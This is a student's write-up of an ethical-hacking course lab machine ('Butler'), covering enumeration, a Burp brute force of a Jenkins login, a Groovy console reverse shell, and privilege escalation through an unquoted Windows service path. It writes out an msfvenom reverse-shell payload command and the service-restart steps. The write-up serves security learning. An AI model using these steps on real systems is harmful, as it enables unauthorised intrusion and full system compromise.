# 4th Capstone Machine
This is my write-up for the fourth machine in the capstone section of the Practical Ethical Hacking course.

## Machine Information
- **Name**: Butler
- **Difficulty**: Easy
- **OS**: Windows 10
  
## Tools Used
- nmap: For port scanning and service enumeration.
- Burp Suite: For modifying requests and brute forcing logins.
- netcat: To create port listeners.
- winPEAS: To search for possible local privilege escalation paths.
- MSFvenom: To create a rever shell payload.

## Objectives
- Enumerate the system and identify services.
- Discover vulnerabilities within the system.
- Exploit the vulnerabilities to gain user access.
- Escalate privileges to root.
  
## Enumeration
1. Nmap scan:
  
    - The first step was to enumerate open ports and services using nmap:
    
        `nmap -A -vv -p- <target IP>`
    
    - Open Ports:
      
      - 8080/tcp (HTTP) - Jetty server
     
      - Other port found non-critical (pando-pub)
  
2. Port 8080 HTTP Enumeration:

    - Connected to web server on port 8080.
  
    - Jenkins login page.     
     
## Vulnerability Discovery
1. Brute Forcing Login:
   
     - Add credentials to Intruder in Burp Suite
  
     - Ran intruder and found the request that had a different length response. This was the correct credentials to login.
  
     - After looking through the webapp, I found a console that runs an arbitrary groovy script on the server.
    
## Exploitation
  - Researched vulnerabilities for Groovy but found a reverse shell instead.

  - Set up a netcat listener and ran the Groovy reverse shell on the console.

  - Caught a shell as the user butler.   
  
## Privilege Escalation
   - Ran winpeas to look for potential privesc paths.

   - Discovered an unquoted service executable path that is ran by the system named WiseBootAssistant.

         `C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe`

   - Created a reverse shell to place in the middle of the path of the executable using MSFvenom:

         `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<host IP> LPORT=7777 -f exe > Wise.exe`
     
   - Started a netcat listener and placed the reverse shell in C:\Program Files (x86)\Wise.

   - Started and stopped the service

         `sc stop WiseBootAssistant`

         `sc start WiseBootAssistant`
     
   - Netcat caught a shell as nt authority\system
    
## Lessons Learned
This machine reinforced the importance of systematically enumerating exposed services and leveraging tools like Burp Suite and winPEAS to identify and exploit both login flaws and privilege escalation paths.
Using the Groovy script console and exploiting an unquoted service path deepened my understanding of how misconfigurations can provide significant entry points, especially in Windows environments.
Overall, this exercise highlighted the value of combining automated tools with manual investigation to comprehensively assess security risks.
